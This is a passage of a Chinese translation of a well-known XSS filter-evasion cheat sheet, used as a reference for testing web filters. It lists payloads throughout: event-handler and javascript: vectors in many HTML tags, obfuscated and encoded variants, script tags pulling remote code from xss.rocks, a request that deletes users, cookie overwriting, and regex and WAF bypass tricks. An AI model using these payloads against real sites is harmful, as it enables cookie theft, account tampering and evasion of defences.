&lt;h2 id=&quot;基于事件iframe&quot;&gt;基于事件IFRAME&lt;/h2&gt;

&lt;p&gt;Iframes和大多数其他元素可以使用下列事件（由David Cross提交）:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;frame&quot;&gt;FRAME&lt;/h2&gt;

&lt;p&gt;Frames和iframe一样有很多XSS问题:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;&amp;lt;/FRAMESET&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;table&quot;&gt;TABLE&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;TABLE BACKGROUND=&quot;javascript:alert('XSS')&quot;&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;td&quot;&gt;&lt;strong&gt;TD&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;和上面一样，TD也可以通过BACKGROUND来包含JavaScriptXSS攻击向量:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;TABLE&amp;gt;&amp;lt;TD BACKGROUND=&quot;javascript:alert('XSS')&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;div&quot;&gt;DIV&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;DIV STYLE=&quot;background-image: url(javascript:alert('XSS'))&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含有unicode-xss利用代码的div背景图像&quot;&gt;&lt;strong&gt;含有Unicode XSS利用代码的DIV背景图像&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;这进行了一些修改来混淆URL参数。原始的漏洞是由RenaudLifchitz在Hotmail发现的:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含有额外字符的div背景图像&quot;&gt;&lt;strong&gt;含有额外字符的DIV背景图像&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Rnaske进行了一个快速的XSS模糊测试来发现IE和安全模式下的Netscape  8.1中任何可以在左括号和JavaScript指令间加入的额外字符。这都是十进制的但是你也可以使用十六进制来填充（以下字符可用：1-32,  34, 39, 160, 8192-8.13, 12288, 65279）:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;DIV STYLE=&quot;background-image: url(&amp;amp;#1;javascript:alert('XSS'))&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;div表达式&quot;&gt;&lt;strong&gt;DIV表达式&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;一个非常有效的对抗现实中的跨站脚本过滤器的变体是在冒号和”expression”之间添加一个换行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;DIV STYLE=&quot;width: expression(alert('XSS'));&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;html-条件选择注释块&quot;&gt;html 条件选择注释块&lt;/h2&gt;

&lt;p&gt;只能在IE5.0及更高版本和IE渲染引擎模式下的Netscape  8.1生效。一些网站认为在注释中的任何内容都是安全的并且认为没有必要移除，这就允许我们添加跨站脚本攻击向量。系统会在一些内容周围尝试添加注释标签以便安全的渲染它们。如我们所见，这有时并不起作用：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;!--[if gte IE 4]&amp;gt;
&amp;lt;SCRIPT&amp;gt;alert('XSS');&amp;lt;/SCRIPT&amp;gt;
&amp;lt;![endif]--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;base标签&quot;&gt;BASE标签&lt;/h2&gt;

&lt;p&gt;在IE和安全模式下的Netscape  8.1有效。你需要使用//来注释下个字符，这样你就不会造成JavaScript错误并且你的XSS标签可以被渲染。同样，这需要当前网站使用相对路径例如”images/image.jpg”来放置图像而不是绝对路径。如果路径以一个斜杠开头例如”/images/image.jpg”你可以从攻击向量中移除一个斜杠（只有在两个斜杠时注释才会生效）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BASE HREF=&quot;javascript:alert('XSS');//&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;object标签&quot;&gt;OBJECT标签&lt;/h2&gt;

&lt;p&gt;如果允许使用OBJECT，你可以插入一个病毒攻击载荷来感染用户，类似于APPLET标签。链接文件实际是含有你XSS攻击代码的HTML文件:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://xss.rocks/scriptlet.html&quot;&amp;gt;&amp;lt;/OBJECT&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用embed标签加载含有xss的flash文件&quot;&gt;使用EMBED标签加载含有XSS的FLASH文件&lt;/h2&gt;

&lt;p&gt;如果你添加了属性allowScriptAccess=”never”以及allownetworking=”internal”则可以减小风险（感谢Jonathan Vanasco提供的信息）:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw        IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&amp;gt;&amp;lt;/EMBED&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用embed-svg包含攻击向量&quot;&gt;使用EMBED SVG包含攻击向量&lt;/h2&gt;

&lt;p&gt;该示例只在FireFox下有效，但是比上面的攻击向量在FireFox下好，因为不需要用户安装或启用FLASH。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw        IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&amp;gt;&amp;lt;/EMBED&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;在flash中使用actionscript混淆xss攻击向量&quot;&gt;在FLASH中使用ActionScript混淆XSS攻击向量&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;a=&quot;get&quot;;
b=&quot;URL(\&quot;&quot;;
c=&quot;javascript:&quot;;
d=&quot;alert('XSS');\&quot;)&quot;;
eval(a+b+c+d);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;cdata混淆的xml数据岛&quot;&gt;CDATA混淆的XML数据岛&lt;/h2&gt;

&lt;p&gt;这个XSS攻击只在IE和使用IE渲染模式的Netscape 8.1下有效-攻击向量由Sec Consult在审计Yahoo时发现&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XML ID=&quot;xss&quot;&amp;gt;&amp;lt;I&amp;gt;&amp;lt;B&amp;gt;&amp;lt;IMG SRC=&quot;javas&amp;lt;!-- --&amp;gt;cript:alert('XSS')&quot;&amp;gt;&amp;lt;/B&amp;gt;&amp;lt;/I&amp;gt;&amp;lt;/XML&amp;gt;
&amp;lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&amp;gt;&amp;lt;/SPAN&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用xml数据岛生成含内嵌javascript的本地xml文件&quot;&gt;使用XML数据岛生成含内嵌JavaScript的本地XML文件&lt;/h2&gt;

&lt;p&gt;这和上面是一样的但是将来源替换为了包含跨站脚本攻击向量的本地XML文件（必须在同一服务器上）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XML SRC=&quot;xsstest.xml&quot; ID=I&amp;gt;&amp;lt;/XML&amp;gt;
&amp;lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&amp;gt;&amp;lt;/SPAN&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;xml中使用htmltime&quot;&gt;XML中使用HTML+TIME&lt;/h2&gt;

&lt;p&gt;这是Grey Magic攻击Hotmail和Yahoo的方法。这只在IE和IE渲染模式下的Netscape8.1有效并且记得需要在HTML域的BODY标签中间才有效：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;HTML&amp;gt;&amp;lt;BODY&amp;gt;        
&amp;lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&amp;gt;
&amp;lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&amp;gt;
&amp;lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;
&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用一些字符绕过js过滤&quot;&gt;使用一些字符绕过”.js”过滤&lt;/h2&gt;

&lt;p&gt;你可以将你的JavaScript文件重命名为图像来作为XSS攻击向量：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=&quot;http://xss.rocks/xss.jpg&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;ssi服务端脚本包含&quot;&gt;SSI（服务端脚本包含）&lt;/h2&gt;

&lt;p&gt;这需要在服务器端允许SSI来使用XSS攻击向量。似乎不用提示这点，因为如果你可以在服务器端执行指令那一定是有更严重的问题存在：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;!--#exec cmd=&quot;/bin/echo '&amp;lt;SCR'&quot;--&amp;gt;&amp;lt;!--#exec cmd=&quot;/bin/echo 'IPT SRC=http://xss.rocks/xss.js&amp;gt;&amp;lt;/SCRIPT&amp;gt;'&quot;--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;php&quot;&gt;PHP&lt;/h2&gt;

&lt;p&gt;需要服务器端安装了PHP来使用XSS攻击向量。同样，如果你可以远程运行任意脚本，那会有更加严重的问题：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;? echo('&amp;lt;SCR)';
echo('IPT&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/SCRIPT&amp;gt;'); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;嵌入命令的image&quot;&gt;嵌入命令的IMAGE&lt;/h2&gt;

&lt;p&gt;当页面受密码保护并且这个密码保护同样适用于相同域的不同页面时有效，这可以用来进行删除用户，增加用户（如果访问页面的是管理员的话），将密码发送到任意地方等等。。。这是一个较少使用当时更有价值的XSS攻击向量&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;嵌入命令的image-ii&quot;&gt;&lt;strong&gt;嵌入命令的IMAGE II&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;这更加可怕因为这不包含任何可疑标识，除了它不在你自己的域名上。这个攻击向量使用一个302或304（其他的也有效）来重定向图片到指定命令。所以一个普通的&lt;img src=&quot;httx://badguy.com/a.jpg&quot; /&gt;对于访问图片链接的用户来说也有可能是一个攻击向量。下面是利用.htaccess（Apache）配置文件来实现攻击向量。（感谢Timo提供这部分。）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;amp;deleteuser
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;cookie篡改&quot;&gt;Cookie篡改&lt;/h2&gt;

&lt;p&gt;尽管公认不太实用，但是还是可以发现一些允许使用META标签的情况下可用它来覆写cookie。另外的例子是当用户访问网站页面时，一些网站读取并显示存储在cookie中的用户名，而不是数据库中。当这两种场景结合时，你可以修改受害者的cookie以便将JavaScript注入到其页面中（你可以使用这个让用户登出或改变他们的用户状态，甚至可以让他们以你的账户登录）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;    
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;utf-7编码&quot;&gt;UTF-7编码&lt;/h2&gt;

&lt;p&gt;如果存在XSS的页面没有提供页面编码头部，或者使用了任何设置为使用UTF-7编码的浏览器，就可以使用下列方式进行攻击（感谢Roman  Ivanov提供）。这在任何不改变编码类型的现代浏览器上是无效的，这也是为什么标记为完全不支持的原因。Watchfire在Google的自定义404脚本中发现这个问题：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;HEAD&amp;gt;&amp;lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&amp;gt; &amp;lt;/HEAD&amp;gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;利用html引号包含的xss&quot;&gt;利用HTML引号包含的XSS&lt;/h2&gt;

&lt;p&gt;这在IE中测试通过，但还得视情况而定。它是为了绕过那些允许”&lt;script&gt;&quot;但是不允许&quot;&amp;lt;SCRIPT SRC...&quot;形式的正则过滤即&quot;/&amp;lt;script[^&amp;gt;]+src/i&quot;：&lt;/script&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=&quot;&amp;gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是为了绕过那些允许”&lt;script&gt;&quot;但是不允许&quot;&amp;lt;SCRIPTSRC...&quot;形式的正则过滤即&quot;  /&amp;lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|'(.)*?'|[^'&quot;&amp;gt;\s]+))?)+\s*|\s*)src/i&quot;（这很重要，因为在实际环境中出现过这种正则过滤）：&lt;/script&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT =&quot;&amp;gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;另一个绕过此正则过滤” /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)*?”&lt;/td&gt;
      &lt;td&gt;’(.)*?’&lt;/td&gt;
      &lt;td&gt;[^’”&amp;gt;\s]+))?)+\s*&lt;/td&gt;
      &lt;td&gt;\s*)src/i”的XSS：&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=&quot;&amp;gt;&quot; '' SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;又一个绕过正则过滤”  /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)*?”&lt;/td&gt;
      &lt;td&gt;’(.)*?’&lt;/td&gt;
      &lt;td&gt;[^’”&amp;gt;\s]+))?)+\s*&lt;/td&gt;
      &lt;td&gt;\s*)src/i”的XSS。尽管不想提及防御方法，但如果你想允许&lt;script&gt;标签但不加载远程脚本，针对这种XSS只能使用状态机去防御（当然如果允许&lt;script&gt;标签的话，还有其他方法绕过）&lt;/script&gt;&lt;/script&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT &quot;a='&amp;gt;'&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;最后一个绕过此正则过滤” /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)*?”&lt;/td&gt;
      &lt;td&gt;’(.)*?’&lt;/td&gt;
      &lt;td&gt;[^’”&amp;gt;\s]+))?)+\s*&lt;/td&gt;
      &lt;td&gt;\s*)src/i”的XSS，使用了重音符（在FireFox下无效）：&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=`&amp;gt;` SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是一个XSS样例，用来绕过那些不会检查引号配对，而是发现任何引号就立即结束参数字符串的正则表达式：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=&quot;&amp;gt;'&amp;gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;url字符绕过&quot;&gt;URL字符绕过&lt;/h2&gt;

&lt;p&gt;假定”http://www.google.com/”是不被允许的：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;IP代替域名&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://66.102.7.147/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;URL编码&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;双字节编码&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://1113982867/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;十六进制编码&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;每个数字的允许的范围大概是240位字符，就如你在第二位上看到的，并且由于十六进制是在0到F之间，所以开头的0可以省略:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;八进制编码&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;又一次允许填充，尽管你必须保证每类在4位字符以上-例如A类，B类等等&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;  &amp;lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;混合编码&quot;&gt;&lt;strong&gt;混合编码&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;让我们混合基本编码并在其中插入一些TAB和换行，虽然不知道浏览器为什么允许这样做。TAB和换行只有被引号包含时才有效&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;    &amp;lt;A HREF=&quot;h

    tt	p://6	6.000146.0x7.147/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;协议解析绕过&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;(// 替代http://可以节约很多字节).当输入空间有限时很有用(少两个字符可能解决大问题)  而且可以轻松绕过类似”(ht&lt;/td&gt;
      &lt;td&gt;f)tp(s)?://”的正则过滤(感谢Ozh提供这部分).你也可以将”//”换成”\“。你需要保证斜杠在正确的位置，否则可能被当成相对路径URL:&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;//www.google.com/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Google的”feeling lucky”功能1&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Firefox使用Google的”feeling  lucky”功能根据用户输入的任何关键词来将用户重定向。如果你存在漏洞的页面在某些随机关键词上搜索引擎排名是第一的，你就可以利用这一特性来攻击FireFox用户。这使用了Firefox的”keyword:”协议。你可以像下面一样使用多个关键词”keyword:XSS+RSnake”。这在Firefox2.0后不再有效.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;//google&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Google的”feeling lucky”功能2&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这使用了一个仅在FireFox上有效的小技巧，因为它实现了”feelinglucky”功能。不像下面一个例子，这个在Opera上无效因为Opera会认为只是一个老式的HTTP基础认证钓鱼攻击，但它并不是。它只是一个畸形的URL。如果你点击了对话框的确定，它就可以生效。但是在Opera上会是一个错误对话框，所以认为其不被Opera所支持，同样在Firefox2.0后不再有效。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://ha.ckers.org@google&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Google的”feeling lucky”功能3&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这是一个畸形的URL只在FireFox和Opera下有效，因为它们实现了”feeling lucky”功能。像上面的例子一样，它要求你的攻击页面在Google上特定关键词排名第一（在这个示例里关键词是”google”）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://google:ha.ckers.org&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;移除别名&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;当结合上面的URL，移除”www.”会节约4个字节，总共为正确设置的服务器节省9字节:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://google.com/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;绝对DNS名称后额外的点&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://www.google.com./&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;JavaScriptlink location&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;javascript:document.location='http://www.google.com/'&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;内容替换作为攻击向量&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;假设”http://www.google.com/”会自动替换为空。我实际使用过类似的攻击向量即通过使用转换过滤器本身（示例如下）来帮助构建攻击向量以对抗现实世界的XSS过滤器:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://www.google.com/ogle.com/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;字符转义表&quot;&gt;字符转义表&lt;/h2&gt;

&lt;p&gt;下面是HTML和JavaScript中字符“&amp;lt;”的所有可能组合。其中大部分不会被渲染出来，但其中许多可以在某些情况下呈现出来。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;
%3C
&amp;amp;lt
&amp;amp;lt;
&amp;amp;LT
&amp;amp;LT;
&amp;amp;#60
&amp;amp;#060
&amp;amp;#0060
&amp;amp;#00060
&amp;amp;#000060
&amp;amp;#0000060
&amp;amp;#60;
&amp;amp;#060;
&amp;amp;#0060;
&amp;amp;#00060;
&amp;amp;#000060;
&amp;amp;#0000060;
&amp;amp;#x3c
&amp;amp;#x03c
&amp;amp;#x003c
&amp;amp;#x0003c
&amp;amp;#x00003c
&amp;amp;#x000003c
&amp;amp;#x3c;
&amp;amp;#x03c;
&amp;amp;#x003c;
&amp;amp;#x0003c;
&amp;amp;#x00003c;
&amp;amp;#x000003c;
&amp;amp;#X3c
&amp;amp;#X03c
&amp;amp;#X003c
&amp;amp;#X0003c
&amp;amp;#X00003c
&amp;amp;#X000003c
&amp;amp;#X3c;
&amp;amp;#X03c;
&amp;amp;#X003c;
&amp;amp;#X0003c;
&amp;amp;#X00003c;
&amp;amp;#X000003c;
&amp;amp;#x3C
&amp;amp;#x03C
&amp;amp;#x003C
&amp;amp;#x0003C
&amp;amp;#x00003C
&amp;amp;#x000003C
&amp;amp;#x3C;
&amp;amp;#x03C;
&amp;amp;#x003C;
&amp;amp;#x0003C;
&amp;amp;#x00003C;
&amp;amp;#x000003C;
&amp;amp;#X3C
&amp;amp;#X03C
&amp;amp;#X003C
&amp;amp;#X0003C
&amp;amp;#X00003C
&amp;amp;#X000003C
&amp;amp;#X3C;
&amp;amp;#X03C;
&amp;amp;#X003C;
&amp;amp;#X0003C;
&amp;amp;#X00003C;
&amp;amp;#X000003C;
\x3c
\x3C
\u003c
\u003C
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;绕过waf的方法&quot;&gt;绕过WAF的方法&lt;/h1&gt;

&lt;h2 id=&quot;通用问题&quot;&gt;通用问题&lt;/h2&gt;

&lt;h3 id=&quot;存储型xss&quot;&gt;存储型XSS&lt;/h3&gt;

&lt;p&gt;如果攻击者已经让XSS绕过过滤器，WAF无法阻止攻击透过&lt;/p&gt;

&lt;h3 id=&quot;基于javascript的反射型xss&quot;&gt;基于JavaScript的反射型XSS&lt;/h3&gt;

